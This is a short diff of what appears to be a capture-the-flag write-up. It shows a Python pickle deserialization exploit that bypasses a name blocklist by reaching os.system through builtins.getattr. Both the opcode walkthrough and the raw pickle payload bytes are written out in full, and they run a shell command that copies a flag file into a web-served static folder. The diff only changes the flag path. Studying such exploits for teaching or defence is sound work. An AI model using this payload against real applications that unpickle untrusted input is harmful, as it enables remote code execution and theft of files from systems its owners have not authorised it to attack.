@@ -106,7 +106,7 @@ PUT     memo[0]                      # Store os module
 GLOBAL  builtins.getattr             # Allowed! getattr not blocked  
 REDUCE  (memo[0], 'system')          # Returns: os.system (bypasses name check!)
 
-REDUCE  ('cp /flag.txt /app/static/exfil.txt',)  # RCE!
+REDUCE  ('cp /flag/flag /app/static/exfil.txt',)  # RCE!
 ```
 
 ### Raw Pickle Opcodes
@@ -118,7 +118,7 @@ payload += b'(S\'os\'\ntR'                       # CALL('os') -> os module
 payload += b'p0\n'                               # PUT 0 (store in memo)
 payload += b'cbuiltins\ngetattr\n'               # GLOBAL builtins.getattr
 payload += b'(g0\nS\'system\'\ntR'               # CALL(memo[0], 'system') -> os.system
-payload += b'(S\'cp /flag.txt /app/static/exfil.txt\'\n'
+payload += b'(S\'cp /flag/flag /app/static/exfil.txt\'\n'
 payload += b'tR'                                 # CALL(command) -> RCE!
 payload += b'.'                                  # STOP
 ```
